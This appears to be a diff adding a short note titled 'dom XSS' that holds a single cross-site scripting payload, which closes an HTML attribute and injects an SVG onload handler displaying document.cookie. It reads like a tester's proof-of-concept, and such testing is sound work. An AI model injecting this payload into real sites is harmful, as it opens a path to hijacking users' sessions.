@@ -1,0 +1,3 @@
+dom XSS
+
+mypayload"><svg onload=alert(document.cookie)>
